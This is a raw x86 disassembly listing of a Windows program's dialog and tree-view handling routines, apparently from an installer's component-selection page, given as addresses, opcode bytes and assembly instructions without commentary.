  40504f:	83 f8 10             	cmp    $0x10,%eax
  405052:	7d 0d                	jge    0x405061
  405054:	57                   	push   %edi
  405055:	6a 10                	push   $0x10
  405057:	68 1b 11 00 00       	push   $0x111b
  40505c:	ff 75 fc             	push   -0x4(%ebp)
  40505f:	ff d6                	call   *%esi
  405061:	53                   	push   %ebx
  405062:	ff 15 54 80 40 00    	call   *0x408054
  405068:	33 db                	xor    %ebx,%ebx
  40506a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40506d:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  405070:	3b c7                	cmp    %edi,%eax
  405072:	74 27                	je     0x40509b
  405074:	83 fb 20             	cmp    $0x20,%ebx
  405077:	74 03                	je     0x40507c
  405079:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40507c:	50                   	push   %eax
  40507d:	57                   	push   %edi
  40507e:	e8 36 15 00 00       	call   0x4065b9
  405083:	50                   	push   %eax
  405084:	57                   	push   %edi
  405085:	68 43 01 00 00       	push   $0x143
  40508a:	ff 75 f8             	push   -0x8(%ebp)
  40508d:	ff d6                	call   *%esi
  40508f:	53                   	push   %ebx
  405090:	50                   	push   %eax
  405091:	68 51 01 00 00       	push   $0x151
  405096:	ff 75 f8             	push   -0x8(%ebp)
  405099:	ff d6                	call   *%esi
  40509b:	43                   	inc    %ebx
  40509c:	83 fb 21             	cmp    $0x21,%ebx
  40509f:	7c c9                	jl     0x40506a
  4050a1:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4050a4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050a7:	ff 74 83 30          	push   0x30(%ebx,%eax,4)
  4050ab:	6a 15                	push   $0x15
  4050ad:	ff 75 08             	push   0x8(%ebp)
  4050b0:	e8 46 f4 ff ff       	call   0x4044fb
  4050b5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050b8:	ff 74 83 34          	push   0x34(%ebx,%eax,4)
  4050bc:	6a 16                	push   $0x16
  4050be:	ff 75 08             	push   0x8(%ebp)
  4050c1:	e8 35 f4 ff ff       	call   0x4044fb
  4050c6:	33 db                	xor    %ebx,%ebx
  4050c8:	39 3d 4c 9a 42 00    	cmp    %edi,0x429a4c
  4050ce:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4050d1:	0f 8e ca 00 00 00    	jle    0x4051a1
  4050d7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4050da:	8d 50 08             	lea    0x8(%eax),%edx
  4050dd:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4050e0:	8d 42 10             	lea    0x10(%edx),%eax
  4050e3:	66 39 38             	cmp    %di,(%eax)
  4050e6:	0f 84 97 00 00 00    	je     0x405183
  4050ec:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4050ef:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4050f2:	8b 02                	mov    (%edx),%eax
  4050f4:	6a 20                	push   $0x20
  4050f6:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  4050f9:	59                   	pop    %ecx
  4050fa:	8b d0                	mov    %eax,%edx
  4050fc:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  405103:	23 d1                	and    %ecx,%edx
  405105:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  40510c:	a8 02                	test   $0x2,%al
  40510e:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  405111:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405114:	89 55 bc             	mov    %edx,-0x44(%ebp)
  405117:	74 3a                	je     0x405153
  405119:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40511c:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  405123:	50                   	push   %eax
  405124:	57                   	push   %edi
  405125:	68 32 11 00 00       	push   $0x1132
  40512a:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  405131:	ff 75 fc             	push   -0x4(%ebp)
  405134:	ff d6                	call   *%esi
  405136:	8b 0d 00 2f 42 00    	mov    0x422f00,%ecx
  40513c:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  405143:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  405146:	a1 00 2f 42 00       	mov    0x422f00,%eax
  40514b:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  40514e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405151:	eb 30                	jmp    0x405183
  405153:	a8 04                	test   $0x4,%al
  405155:	74 14                	je     0x40516b
  405157:	ff 75 f4             	push   -0xc(%ebp)
  40515a:	6a 03                	push   $0x3
  40515c:	68 0a 11 00 00       	push   $0x110a
  405161:	ff 75 fc             	push   -0x4(%ebp)
  405164:	ff d6                	call   *%esi
  405166:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405169:	eb 18                	jmp    0x405183
  40516b:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40516e:	50                   	push   %eax
  40516f:	57                   	push   %edi
  405170:	68 32 11 00 00       	push   $0x1132
  405175:	ff 75 fc             	push   -0x4(%ebp)
  405178:	ff d6                	call   *%esi
  40517a:	8b 0d 00 2f 42 00    	mov    0x422f00,%ecx
  405180:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  405183:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  405186:	43                   	inc    %ebx
  405187:	81 c2 18 08 00 00    	add    $0x818,%edx
  40518d:	3b 1d 4c 9a 42 00    	cmp    0x429a4c,%ebx
  405193:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  405196:	0f 8c 44 ff ff ff    	jl     0x4050e0
  40519c:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  40519f:	75 19                	jne    0x4051ba
  4051a1:	6a f0                	push   $0xfffffff0
  4051a3:	ff 75 fc             	push   -0x4(%ebp)
  4051a6:	ff 15 d4 81 40 00    	call   *0x4081d4
  4051ac:	24 fb                	and    $0xfb,%al
  4051ae:	50                   	push   %eax
  4051af:	6a f0                	push   $0xfffffff0
  4051b1:	ff 75 fc             	push   -0x4(%ebp)
  4051b4:	ff 15 40 82 40 00    	call   *0x408240
  4051ba:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  4051bd:	75 18                	jne    0x4051d7
  4051bf:	6a 05                	push   $0x5
  4051c1:	ff 75 f8             	push   -0x8(%ebp)
  4051c4:	ff 15 28 82 40 00    	call   *0x408228
  4051ca:	ff 75 f8             	push   -0x8(%ebp)
  4051cd:	e8 5e f3 ff ff       	call   0x404530
  4051d2:	e9 89 03 00 00       	jmp    0x405560
  4051d7:	ff 75 fc             	push   -0x4(%ebp)
  4051da:	e8 51 f3 ff ff       	call   0x404530
  4051df:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4051e6:	75 12                	jne    0x4051fa
  4051e8:	33 c9                	xor    %ecx,%ecx
  4051ea:	89 7d 10             	mov    %edi,0x10(%ebp)
  4051ed:	41                   	inc    %ecx
  4051ee:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4051f5:	89 4d 14             	mov    %ecx,0x14(%ebp)
  4051f8:	eb 03                	jmp    0x4051fd
  4051fa:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4051fd:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  405201:	b8 13 04 00 00       	mov    $0x413,%eax
  405206:	74 09                	je     0x405211
  405208:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40520b:	0f 85 e4 00 00 00    	jne    0x4052f5
  405211:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405214:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405217:	74 0d                	je     0x405226
  405219:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  405220:	0f 85 cf 00 00 00    	jne    0x4052f5
  405226:	f6 05 39 9a 42 00 02 	testb  $0x2,0x429a39
  40522d:	75 73                	jne    0x4052a2
  40522f:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405232:	74 09                	je     0x40523d
  405234:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405237:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  40523b:	75 65                	jne    0x4052a2
  40523d:	33 c9                	xor    %ecx,%ecx
  40523f:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405242:	0f 95 c1             	setne  %cl
  405245:	51                   	push   %ecx
  405246:	ff 75 fc             	push   -0x4(%ebp)
  405249:	e8 68 fc ff ff       	call   0x404eb6
  40524e:	8b d8                	mov    %eax,%ebx
  405250:	3b df                	cmp    %edi,%ebx
  405252:	7c 4e                	jl     0x4052a2
  405254:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  40525a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40525d:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  405261:	8b 01                	mov    (%ecx),%eax
  405263:	a8 10                	test   $0x10,%al
  405265:	75 3b                	jne    0x4052a2
  405267:	a8 40                	test   $0x40,%al
  405269:	74 11                	je     0x40527c
  40526b:	35 80 00 00 00       	xor    $0x80,%eax
  405270:	84 c0                	test   %al,%al
  405272:	79 04                	jns    0x405278
  405274:	0c 01                	or     $0x1,%al
  405276:	eb 07                	jmp    0x40527f
  405278:	24 fe                	and    $0xfe,%al
  40527a:	eb 03                	jmp    0x40527f
  40527c:	83 f0 01             	xor    $0x1,%eax
  40527f:	53                   	push   %ebx
  405280:	89 01                	mov    %eax,(%ecx)
  405282:	e8 f6 be ff ff       	call   0x40117d
  405287:	a1 38 9a 42 00       	mov    0x429a38,%eax
  40528c:	43                   	inc    %ebx
  40528d:	f7 d0                	not    %eax
  40528f:	c1 e8 08             	shr    $0x8,%eax
  405292:	83 e0 01             	and    $0x1,%eax
  405295:	89 5d 10             	mov    %ebx,0x10(%ebp)
  405298:	89 45 14             	mov    %eax,0x14(%ebp)
  40529b:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4052a2:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  4052a5:	74 4e                	je     0x4052f5
  4052a7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052aa:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  4052b1:	75 0e                	jne    0x4052c1
  4052b3:	ff 70 5c             	push   0x5c(%eax)
  4052b6:	57                   	push   %edi
  4052b7:	68 19 04 00 00       	push   $0x419
  4052bc:	ff 75 fc             	push   -0x4(%ebp)
  4052bf:	ff d6                	call   *%esi
  4052c1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052c4:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  4052cb:	75 28                	jne    0x4052f5
  4052cd:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  4052d1:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4052d4:	8b 40 5c             	mov    0x5c(%eax),%eax
  4052d7:	75 0f                	jne    0x4052e8
  4052d9:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4052df:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4052e3:	83 08 20             	orl    $0x20,(%eax)
  4052e6:	eb 0d                	jmp    0x4052f5
  4052e8:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4052ee:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4052f2:	83 20 df             	andl   $0xffffffdf,(%eax)
  4052f5:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4052fc:	75 6f                	jne    0x40536d
  4052fe:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  405304:	0f 85 56 02 00 00    	jne    0x405560
  40530a:	8b 45 10             	mov    0x10(%ebp),%eax
  40530d:	c1 e8 10             	shr    $0x10,%eax
  405310:	66 3d 01 00          	cmp    $0x1,%ax
  405314:	0f 85 46 02 00 00    	jne    0x405560
  40531a:	57                   	push   %edi
  40531b:	57                   	push   %edi
  40531c:	68 47 01 00 00       	push   $0x147
  405321:	ff 75 f8             	push   -0x8(%ebp)
  405324:	ff d6                	call   *%esi
  405326:	83 f8 ff             	cmp    $0xffffffff,%eax
  405329:	0f 84 31 02 00 00    	je     0x405560
  40532f:	57                   	push   %edi
  405330:	50                   	push   %eax
  405331:	68 50 01 00 00       	push   $0x150
  405336:	ff 75 f8             	push   -0x8(%ebp)
  405339:	ff d6                	call   *%esi
  40533b:	8b d8                	mov    %eax,%ebx
  40533d:	83 fb ff             	cmp    $0xffffffff,%ebx
  405340:	74 08                	je     0x40534a
  405342:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405345:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  405348:	75 03                	jne    0x40534d
  40534a:	6a 20                	push   $0x20
  40534c:	5b                   	pop    %ebx
  40534d:	53                   	push   %ebx
  40534e:	e8 46 bf ff ff       	call   0x401299
  405353:	53                   	push   %ebx
  405354:	57                   	push   %edi
  405355:	68 20 04 00 00       	push   $0x420
  40535a:	ff 75 08             	push   0x8(%ebp)
  40535d:	ff d6                	call   *%esi
  40535f:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  405363:	89 7d 14             	mov    %edi,0x14(%ebp)
  405366:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40536d:	b8 00 02 00 00       	mov    $0x200,%eax
  405372:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405375:	75 08                	jne    0x40537f
  405377:	57                   	push   %edi
  405378:	57                   	push   %edi
  405379:	50                   	push   %eax
  40537a:	ff 75 fc             	push   -0x4(%ebp)
  40537d:	ff d6                	call   *%esi
  40537f:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  405386:	75 32                	jne    0x4053ba
  405388:	a1 ec 2e 42 00       	mov    0x422eec,%eax
  40538d:	3b c7                	cmp    %edi,%eax
  40538f:	74 07                	je     0x405398
  405391:	50                   	push   %eax
  405392:	ff 15 34 80 40 00    	call   *0x408034
  405398:	a1 00 2f 42 00       	mov    0x422f00,%eax
  40539d:	3b c7                	cmp    %edi,%eax
  40539f:	74 07                	je     0x4053a8
  4053a1:	50                   	push   %eax
  4053a2:	ff 15 0c 81 40 00    	call   *0x40810c
  4053a8:	89 3d ec 2e 42 00    	mov    %edi,0x422eec
  4053ae:	89 3d 00 2f 42 00    	mov    %edi,0x422f00
  4053b4:	89 3d 80 9a 42 00    	mov    %edi,0x429a80
  4053ba:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4053c1:	0f 85 5b 01 00 00    	jne    0x405522
  4053c7:	57                   	push   %edi
  4053c8:	57                   	push   %edi
  4053c9:	e8 21 be ff ff       	call   0x4011ef
  4053ce:	8b 45 10             	mov    0x10(%ebp),%eax
  4053d1:	3b c7                	cmp    %edi,%eax
  4053d3:	74 0e                	je     0x4053e3
  4053d5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4053d8:	74 01                	je     0x4053db
  4053da:	48                   	dec    %eax
  4053db:	50                   	push   %eax
  4053dc:	6a 08                	push   $0x8
  4053de:	e8 53 fb ff ff       	call   0x404f36
  4053e3:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4053e6:	74 3f                	je     0x405427
  4053e8:	ff 35 00 2f 42 00    	push   0x422f00
  4053ee:	e8 ef be ff ff       	call   0x4012e2
  4053f3:	8b d8                	mov    %eax,%ebx
  4053f5:	53                   	push   %ebx
  4053f6:	e8 9e be ff ff       	call   0x401299
  4053fb:	33 c0                	xor    %eax,%eax
  4053fd:	33 c9                	xor    %ecx,%ecx
  4053ff:	3b df                	cmp    %edi,%ebx
  405401:	7e 0e                	jle    0x405411
  405403:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405406:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  405409:	74 01                	je     0x40540c
  40540b:	41                   	inc    %ecx
  40540c:	40                   	inc    %eax
  40540d:	3b c3                	cmp    %ebx,%eax
  40540f:	7c f2                	jl     0x405403
  405411:	57                   	push   %edi
  405412:	51                   	push   %ecx
  405413:	68 4e 01 00 00       	push   $0x14e
  405418:	ff 75 f8             	push   -0x8(%ebp)
  40541b:	ff d6                	call   *%esi
  40541d:	89 5d 14             	mov    %ebx,0x14(%ebp)
  405420:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  405427:	57                   	push   %edi
  405428:	57                   	push   %edi
  405429:	e8 c1 bd ff ff       	call   0x4011ef
  40542e:	a1 00 2f 42 00       	mov    0x422f00,%eax
  405433:	39 3d 4c 9a 42 00    	cmp    %edi,0x429a4c
  405439:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40543c:	a1 48 9a 42 00       	mov    0x429a48,%eax
  405441:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  405448:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40544b:	0f 8e 9c 00 00 00    	jle    0x4054ed
  405451:	8d 58 08             	lea    0x8(%eax),%ebx
  405454:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405457:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40545a:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  40545d:	3b c7                	cmp    %edi,%eax
  40545f:	74 74                	je     0x4054d5
  405461:	8b 0b                	mov    (%ebx),%ecx
  405463:	89 45 bc             	mov    %eax,-0x44(%ebp)
  405466:	f6 c5 01             	test   $0x1,%ch
  405469:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  405470:	74 11                	je     0x405483
  405472:	8d 43 10             	lea    0x10(%ebx),%eax
  405475:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  40547c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40547f:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  405483:	f6 c1 40             	test   $0x40,%cl
  405486:	74 05                	je     0x40548d
  405488:	6a 03                	push   $0x3
  40548a:	58                   	pop    %eax
  40548b:	eb 0e                	jmp    0x40549b
  40548d:	8b c1                	mov    %ecx,%eax
  40548f:	83 e0 01             	and    $0x1,%eax
  405492:	40                   	inc    %eax
  405493:	f6 c1 10             	test   $0x10,%cl
  405496:	74 03                	je     0x40549b
  405498:	83 c0 03             	add    $0x3,%eax
  40549b:	8b d1                	mov    %ecx,%edx
  40549d:	ff 75 bc             	push   -0x44(%ebp)
  4054a0:	c1 e0 0b             	shl    $0xb,%eax
  4054a3:	83 e2 08             	and    $0x8,%edx
  4054a6:	0b c2                	or     %edx,%eax
  4054a8:	8b d1                	mov    %ecx,%edx
  4054aa:	c1 f9 05             	sar    $0x5,%ecx
  4054ad:	03 c0                	add    %eax,%eax
  4054af:	83 e2 20             	and    $0x20,%edx
  4054b2:	83 e1 01             	and    $0x1,%ecx
  4054b5:	0b c2                	or     %edx,%eax
  4054b7:	41                   	inc    %ecx
  4054b8:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4054bb:	51                   	push   %ecx
  4054bc:	68 02 11 00 00       	push   $0x1102
  4054c1:	ff 75 fc             	push   -0x4(%ebp)
  4054c4:	ff d6                	call   *%esi
  4054c6:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4054c9:	50                   	push   %eax
  4054ca:	57                   	push   %edi
  4054cb:	68 3f 11 00 00       	push   $0x113f
  4054d0:	ff 75 fc             	push   -0x4(%ebp)
  4054d3:	ff d6                	call   *%esi
  4054d5:	ff 45 ec             	incl   -0x14(%ebp)
  4054d8:	81 c3 18 08 00 00    	add    $0x818,%ebx
  4054de:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4054e1:	3b 05 4c 9a 42 00    	cmp    0x429a4c,%eax
  4054e7:	0f 8c 67 ff ff ff    	jl     0x405454
  4054ed:	66 81 3d de 9a 42 00 	cmpw   $0x400,0x429ade
  4054f4:	00 04 
  4054f6:	75 0c                	jne    0x405504
  4054f8:	6a 01                	push   $0x1
  4054fa:	57                   	push   %edi
  4054fb:	ff 75 fc             	push   -0x4(%ebp)
  4054fe:	ff 15 54 82 40 00    	call   *0x408254
  405504:	a1 fc 89 42 00       	mov    0x4289fc,%eax
  405509:	39 78 10             	cmp    %edi,0x10(%eax)
  40550c:	74 14                	je     0x405522
  40550e:	6a 05                	push   $0x5
  405510:	e8 74 f9 ff ff       	call   0x404e89
  405515:	50                   	push   %eax
  405516:	6a fb                	push   $0xfffffffb
  405518:	68 ff 03 00 00       	push   $0x3ff
  40551d:	e8 4f f9 ff ff       	call   0x404e71
  405522:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  405529:	75 35                	jne    0x405560
  40552b:	f6 05 39 9a 42 00 01 	testb  $0x1,0x429a39
  405532:	74 2c                	je     0x405560
  405534:	33 c0                	xor    %eax,%eax
  405536:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  40553a:	8b 35 28 82 40 00    	mov    0x408228,%esi
  405540:	0f 94 c0             	sete   %al
  405543:	c1 e0 03             	shl    $0x3,%eax
  405546:	8b f8                	mov    %eax,%edi
  405548:	57                   	push   %edi
  405549:	ff 75 fc             	push   -0x4(%ebp)
  40554c:	ff d6                	call   *%esi
  40554e:	57                   	push   %edi
  40554f:	68 fe 03 00 00       	push   $0x3fe
  405554:	ff 75 08             	push   0x8(%ebp)
  405557:	ff 15 3c 82 40 00    	call   *0x40823c
  40555d:	50                   	push   %eax
  40555e:	ff d6                	call   *%esi
  405560:	ff 75 14             	push   0x14(%ebp)
  405563:	ff 75 10             	push   0x10(%ebp)
  405566:	ff 75 0c             	push   0xc(%ebp)
  405569:	e8 f4 ef ff ff       	call   0x404562
  40556e:	5f                   	pop    %edi
  40556f:	5e                   	pop    %esi
  405570:	5b                   	pop    %ebx
  405571:	c9                   	leave
  405572:	c2 10 00             	ret    $0x10
  405575:	55                   	push   %ebp
  405576:	8b ec                	mov    %esp,%ebp
  405578:	53                   	push   %ebx
  405579:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40557c:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  405582:	57                   	push   %edi
  405583:	75 14                	jne    0x405599
  405585:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  405589:	75 59                	jne    0x4055e4
  40558b:	68 13 04 00 00       	push   $0x413
  405590:	e8 b2 ef ff ff       	call   0x404547
  405595:	33 c0                	xor    %eax,%eax
  405597:	eb 62                	jmp    0x4055fb
  405599:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  40559f:	75 20                	jne    0x4055c1
  4055a1:	ff 75 08             	push   0x8(%ebp)
  4055a4:	ff 15 b4 81 40 00    	call   *0x4081b4
  4055aa:	85 c0                	test   %eax,%eax
  4055ac:	74 36                	je     0x4055e4
  4055ae:	6a 01                	push   $0x1
  4055b0:	ff 75 08             	push   0x8(%ebp)
  4055b3:	e8 fe f8 ff ff       	call   0x404eb6
  4055b8:	8b f8                	mov    %eax,%edi
  4055ba:	bb 19 04 00 00       	mov    $0x419,%ebx
  4055bf:	eb 03                	jmp    0x4055c4
  4055c1:	8b 7d 14             	mov    0x14(%ebp),%edi
  4055c4:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  4055ca:	75 1b                	jne    0x4055e7
  4055cc:	39 3d f4 2e 42 00    	cmp    %edi,0x422ef4
  4055d2:	74 13                	je     0x4055e7
  4055d4:	57                   	push   %edi
  4055d5:	6a 06                	push   $0x6
  4055d7:	89 3d f4 2e 42 00    	mov    %edi,0x422ef4
  4055dd:	e8 54 f9 ff ff       	call   0x404f36
  4055e2:	eb 03                	jmp    0x4055e7
  4055e4:	8b 7d 14             	mov    0x14(%ebp),%edi
  4055e7:	57                   	push   %edi
  4055e8:	ff 75 10             	push   0x10(%ebp)
  4055eb:	53                   	push   %ebx
  4055ec:	ff 75 08             	push   0x8(%ebp)
  4055ef:	ff 35 fc 2e 42 00    	push   0x422efc
  4055f5:	ff 15 b8 81 40 00    	call   *0x4081b8
  4055fb:	5f                   	pop    %edi
  4055fc:	5b                   	pop    %ebx
  4055fd:	5d                   	pop    %ebp
  4055fe:	c2 10 00             	ret    $0x10
  405601:	55                   	push   %ebp
  405602:	8b ec                	mov    %esp,%ebp
  405604:	83 ec 30             	sub    $0x30,%esp
  405607:	a1 04 8a 42 00       	mov    0x428a04,%eax
  40560c:	53                   	push   %ebx
  40560d:	56                   	push   %esi
  40560e:	57                   	push   %edi
  40560f:	33 ff                	xor    %edi,%edi
  405611:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405614:	3b c7                	cmp    %edi,%eax
  405616:	0f 84 b1 00 00 00    	je     0x4056cd
  40561c:	8b 1d d4 9a 42 00    	mov    0x429ad4,%ebx
  405622:	be e8 1e 42 00       	mov    $0x421ee8,%esi
  405627:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40562a:	83 e3 01             	and    $0x1,%ebx
  40562d:	75 09                	jne    0x405638
  40562f:	ff 75 08             	push   0x8(%ebp)
  405632:	56                   	push   %esi
  405633:	e8 81 0f 00 00       	call   0x4065b9
  405638:	56                   	push   %esi
  405639:	e8 54 0f 00 00       	call   0x406592
  40563e:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405641:	89 45 08             	mov    %eax,0x8(%ebp)
  405644:	74 1b                	je     0x405661
  405646:	ff 75 0c             	push   0xc(%ebp)
  405649:	e8 44 0f 00 00       	call   0x406592
  40564e:	03 45 08             	add    0x8(%ebp),%eax
  405651:	3d 00 10 00 00       	cmp    $0x1000,%eax
  405656:	73 75                	jae    0x4056cd
  405658:	ff 75 0c             	push   0xc(%ebp)
  40565b:	56                   	push   %esi
  40565c:	e8 37 0f 00 00       	call   0x406598
  405661:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  405665:	75 0d                	jne    0x405674
  405667:	56                   	push   %esi
  405668:	ff 35 e8 89 42 00    	push   0x4289e8
  40566e:	ff 15 1c 82 40 00    	call   *0x40821c
  405674:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  405678:	75 44                	jne    0x4056be
  40567a:	57                   	push   %edi
  40567b:	57                   	push   %edi
  40567c:	68 04 10 00 00       	push   $0x1004
  405681:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  405684:	ff 75 fc             	push   -0x4(%ebp)
  405687:	8b 35 58 82 40 00    	mov    0x408258,%esi
  40568d:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  405694:	ff d6                	call   *%esi
  405696:	2b c3                	sub    %ebx,%eax
  405698:	89 7d d8             	mov    %edi,-0x28(%ebp)
  40569b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40569e:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4056a1:	50                   	push   %eax
  4056a2:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4056a7:	2b c3                	sub    %ebx,%eax
  4056a9:	57                   	push   %edi
  4056aa:	50                   	push   %eax
  4056ab:	ff 75 fc             	push   -0x4(%ebp)
  4056ae:	ff d6                	call   *%esi
  4056b0:	57                   	push   %edi
  4056b1:	ff 75 d4             	push   -0x2c(%ebp)
  4056b4:	68 13 10 00 00       	push   $0x1013
  4056b9:	ff 75 fc             	push   -0x4(%ebp)
  4056bc:	ff d6                	call   *%esi
  4056be:	3b df                	cmp    %edi,%ebx
  4056c0:	74 0b                	je     0x4056cd
  4056c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4056c5:	66 89 3c 45 e8 1e 42 	mov    %di,0x421ee8(,%eax,2)
  4056cc:	00 
  4056cd:	5f                   	pop    %edi
  4056ce:	5e                   	pop    %esi
  4056cf:	5b                   	pop    %ebx
  4056d0:	c9                   	leave
  4056d1:	c2 08 00             	ret    $0x8
  4056d4:	56                   	push   %esi
  4056d5:	8b 35 48 9a 42 00    	mov    0x429a48,%esi
  4056db:	57                   	push   %edi
  4056dc:	8b 3d 4c 9a 42 00    	mov    0x429a4c,%edi
  4056e2:	6a 00                	push   $0x0
  4056e4:	ff 15 98 82 40 00    	call   *0x408298
  4056ea:	09 05 e0 9a 42 00    	or     %eax,0x429ae0
  4056f0:	6a 00                	push   $0x0
  4056f2:	e8 50 ee ff ff       	call   0x404547
  4056f7:	85 ff                	test   %edi,%edi
  4056f9:	74 2b                	je     0x405726
  4056fb:	83 c6 0c             	add    $0xc,%esi
  4056fe:	4f                   	dec    %edi
  4056ff:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405703:	74 0f                	je     0x405714
  405705:	ff 74 24 0c          	push   0xc(%esp)
  405709:	ff 36                	push   (%esi)
  40570b:	e8 79 bc ff ff       	call   0x401389
  405710:	85 c0                	test   %eax,%eax
  405712:	75 0c                	jne    0x405720
  405714:	81 c6 18 08 00 00    	add    $0x818,%esi
  40571a:	85 ff                	test   %edi,%edi
  40571c:	75 e0                	jne    0x4056fe
  40571e:	eb 06                	jmp    0x405726
  405720:	ff 05 ac 9a 42 00    	incl   0x429aac
  405726:	68 04 04 00 00       	push   $0x404
  40572b:	e8 17 ee ff ff       	call   0x404547
  405730:	ff 15 94 82 40 00    	call   *0x408294
  405736:	a1 ac 9a 42 00       	mov    0x429aac,%eax
  40573b:	5f                   	pop    %edi
  40573c:	5e                   	pop    %esi
  40573d:	c2 04 00             	ret    $0x4
  405740:	55                   	push   %ebp
  405741:	8b ec                	mov    %esp,%ebp
  405743:	83 ec 40             	sub    $0x40,%esp
  405746:	53                   	push   %ebx
  405747:	56                   	push   %esi
  405748:	8b 35 04 8a 42 00    	mov    0x428a04,%esi
  40574e:	33 db                	xor    %ebx,%ebx
  405750:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  405757:	57                   	push   %edi
  405758:	89 75 fc             	mov    %esi,-0x4(%ebp)
